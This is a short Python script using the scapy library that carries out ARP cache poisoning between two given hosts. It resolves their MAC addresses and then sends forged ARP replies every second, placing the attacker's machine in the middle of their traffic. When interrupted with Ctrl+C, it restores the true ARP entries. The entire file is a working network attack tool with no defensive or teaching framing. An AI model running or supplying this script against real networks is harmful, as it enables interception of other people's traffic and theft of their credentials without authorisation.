from scapy.all import *
import sys
import time
import os
import signal
conf.verb =0

if(len(sys.argv)==1):
	ip1=raw_input("Enter target ip")
	ip2=raw_input("Enter source ip")
	
	def getMac(ip):
		try:
			val = arping(ip) 
			return val[0][0][1].src
		except:
			return 0
	mac1 = getMac(ip1)


	if(mac1 == 0):
		sys.exit(ip1+"is unreachable")
	mac2 = getMac(ip2)

	if(mac2 == 0):
		sys.exit(ip2+"is unreachable")

	def signal_handler(signal, frame):
		print("\n Someone pressed ctrl+c")
		send(ARP(op=2, psrc=ip1, pdst=ip2, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc =mac2), count =3)

		send(ARP(op=2, psrc=ip2, pdst=ip1, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc =mac1), count =3)
		sys.exit(0)

	signal.signal(signal.SIGINT, signal_handler)

	while True:
		send(ARP(op=2, psrc=ip1, pdst=ip2, hwdst = mac2))
		send(ARP(op=2, psrc=ip2, pdst=ip1, hwdst = mac1))
		print "Spoofing",ip1,"and",ip2
		time.sleep(1)
else :
	def getMac(ip):
		try:
			val = arping(ip) 
			return val[0][0][1].src
		except:
			return 0
	ip1 = sys.argv[1]
	ip2 = sys.argv[2]
	mac1 = getMac(ip1)
	if(mac1 == 0):
		sys.exit(ip1+"is unreachable")
	mac2 = getMac(ip2)

	if(mac2 == 0):
		sys.exit(ip2+"is unreachable")
	#print mac1, " ",mac2
	#os.system("ls")
	def signal_handler(signal, frame):
		print("\n Someone pressed ctrl+c")
		send(ARP(op=2, psrc=ip1, pdst=ip2, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc =mac2), count =3)

		send(ARP(op=2, psrc=ip2, pdst=ip1, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc =mac1), count =3)
		sys.exit(0)
	signal.signal(signal.SIGINT, signal_handler)
	while True:
		send(ARP(op=2, psrc=ip1, pdst=ip2, hwdst = mac2))
		send(ARP(op=2, psrc=ip2, pdst=ip1, hwdst = mac1))
		print "Spoofing",ip1,"and",ip2
		time.sleep(1)
	
